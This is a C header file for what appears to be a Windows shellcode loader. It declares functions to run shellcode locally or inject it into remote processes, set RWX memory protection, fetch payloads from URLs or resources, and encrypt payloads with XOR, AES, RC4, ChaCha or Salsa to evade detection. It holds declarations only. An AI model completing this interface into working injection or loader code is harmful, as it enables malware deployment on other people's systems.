#ifndef SHELLCODE_H
#define SHELLCODE_H

#include <windows.h>

#define SHELLCODE_TYPE_RAW 0x01
#define SHELLCODE_TYPE_XOR 0x02
#define SHELLCODE_TYPE_AES 0x03
#define SHELLCODE_TYPE_RC4 0x04
#define SHELLCODE_TYPE_CHACHA 0x05
#define SHELLCODE_TYPE_SALSA 0x06

#define SHELLCODE_PROTECT_RW 0x01
#define SHELLCODE_PROTECT_RX 0x02
#define SHELLCODE_PROTECT_RWX 0x04

#define SHELLCODE_MAX_SIZE 0x1000000

typedef struct {
    PBYTE data;
    DWORD size;
    DWORD type;
    BYTE key[64];
    DWORD key_len;
    DWORD protection;
    BOOL is_encrypted;
    PVOID allocated_addr;
    DWORD allocated_size;
    CHAR filename[MAX_PATH];
    DWORD entry_point;
    BOOL is_valid;
} SHELLCODE_CTX, *PSHELLCODE_CTX;

typedef struct {
    PBYTE data;
    DWORD size;
    DWORD original_size;
    BYTE key[64];
    DWORD key_len;
    DWORD rounds;
} ENCRYPTION_CTX, *PENCRYPTION_CTX;

extern SHELLCODE_CTX g_shellcode_ctx;

BOOL Shellcode_Initialize(PSHELLCODE_CTX ctx);
VOID Shellcode_Cleanup(PSHELLCODE_CTX ctx);
PVOID Shellcode_Execute(PBYTE shellcode, DWORD size);
PVOID Shellcode_ExecuteEx(PBYTE shellcode, DWORD size, PVOID arg1, PVOID arg2);
BOOL Shellcode_ExecuteRemote(HANDLE hProcess, PBYTE shellcode, DWORD size);
BOOL Shellcode_ExecuteRemoteEx(HANDLE hProcess, PBYTE shellcode, DWORD size, PVOID arg1, PVOID arg2);
PVOID Shellcode_AllocateMemory(DWORD size, DWORD protection);
BOOL Shellcode_FreeMemory(PVOID addr, DWORD size);
BOOL Shellcode_LoadFromFile(LPCSTR filename, PBYTE *data, DWORD *size);
BOOL Shellcode_SaveToFile(LPCSTR filename, PBYTE data, DWORD size);
BOOL Shellcode_LoadFromResource(HMODULE hModule, LPCSTR resource_name, PBYTE *data, DWORD *size);
BOOL Shellcode_LoadFromURL(LPCSTR url, PBYTE *data, DWORD *size);
BOOL Shellcode_Encrypt(PSHELLCODE_CTX ctx, DWORD type, PBYTE key, DWORD key_len);
BOOL Shellcode_Decrypt(PSHELLCODE_CTX ctx);
BOOL Shellcode_Validate(PBYTE data, DWORD size);
PVOID Shellcode_GetEntryPoint(PBYTE data, DWORD size);
BOOL Shellcode_IsValidPE(PBYTE data, DWORD size);
BOOL Shellcode_IsValidShellcode(PBYTE data, DWORD size);
DWORD Shellcode_GetArchitecture(PBYTE data, DWORD size);
BOOL Shellcode_ProtectMemory(PVOID addr, DWORD size, DWORD protection, DWORD *old_protection);
BOOL Shellcode_ChangeProtection(PVOID addr, DWORD size, DWORD new_protection);
BOOL Shellcode_CopyToProcess(HANDLE hProcess, PVOID dest, PBYTE src, DWORD size);
BOOL Shellcode_ReadFromProcess(HANDLE hProcess, PVOID src, PBYTE dest, DWORD size);

VOID Shellcode_XOR(PBYTE data, DWORD size, BYTE key);
VOID Shellcode_XOR_Extended(PBYTE data, DWORD size, PBYTE key, DWORD key_len);
BOOL Shellcode_AES_Encrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len);
BOOL Shellcode_AES_Decrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len);
BOOL Shellcode_AES_EncryptEx(PBYTE data, DWORD size, PBYTE key, DWORD key_len, PBYTE iv, DWORD iv_len);
BOOL Shellcode_AES_DecryptEx(PBYTE data, DWORD size, PBYTE key, DWORD key_len, PBYTE iv, DWORD iv_len);
BOOL Shellcode_RC4_Encrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len);
BOOL Shellcode_RC4_Decrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len);
BOOL Shellcode_ChaCha_Encrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len, PBYTE nonce, DWORD nonce_len);
BOOL Shellcode_ChaCha_Decrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len, PBYTE nonce, DWORD nonce_len);
BOOL Shellcode_Salsa_Encrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len, PBYTE nonce, DWORD nonce_len);
BOOL Shellcode_Salsa_Decrypt(PBYTE data, DWORD size, PBYTE key, DWORD key_len, PBYTE nonce, DWORD nonce_len);

#endif